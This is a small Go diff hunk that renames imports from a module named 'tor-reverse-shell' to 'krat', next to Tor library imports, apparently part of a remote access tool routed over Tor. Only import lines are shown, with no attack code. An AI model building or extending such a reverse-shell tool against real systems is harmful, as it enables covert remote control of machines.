@@ -4,8 +4,8 @@ import (
 	"fmt"
 
 	"github.com/cretz/bine/tor"
-	"github.com/humbertovnavarro/tor-reverse-shell/pkg/config"
-	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor_engine"
+	"github.com/humbertovnavarro/krat/pkg/config"
+	"github.com/humbertovnavarro/krat/pkg/tor_engine"
 	"github.com/ipsn/go-libtor"
 )
 
